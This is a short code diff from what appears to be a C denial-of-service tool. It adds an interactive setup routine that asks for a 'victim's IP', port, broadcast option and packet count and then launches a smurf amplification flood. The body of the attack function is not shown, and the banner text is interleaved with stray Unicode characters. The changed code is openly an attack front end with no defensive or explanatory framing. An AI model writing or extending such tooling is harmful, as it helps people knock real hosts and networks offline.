@@ -99,6 +99,33 @@ void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){
 }
 
 void smurf_setup(){
+
+	system("clear");
+	printf("\033[01;33m"); //set color to yellow
 	printf("IࠥPࠥ ࠥSࠥMࠥUࠥRࠥFࠥ ࠥAࠥTࠥTࠥCࠥKࠥ\n");
-    smurf("192.168.2.3", 6666, 1, 10);
+	printf("\033[0m");//reset color
+	
+	while ((getchar()) != '\n'); //clear out buffer
+
+	char victimIp[32];
+	int victimPort = 0;
+	int broadCast = 1;
+	int nPackets;
+
+
+	printf ("Enter victim's IP : ");
+	fgets(victimIp, 32, stdin);
+	victimIp[strcspn(victimIp, "\n")] = 0;
+
+	printf ("Enter victim's port : ");
+	scanf ("%d", &victimPort);
+
+	printf ("Use broadcast IP? (1 for yes / 0 for no): ");
+	scanf ("%d", &broadCast);
+
+	printf ("Enter number of packets to send : ");
+	scanf ("%d", &nPackets);
+	//TODO read ip from list instead of using broadcast address
+	broadCast = 1;
+    smurf(victimIp, victimPort, broadCast, nPackets);
 }
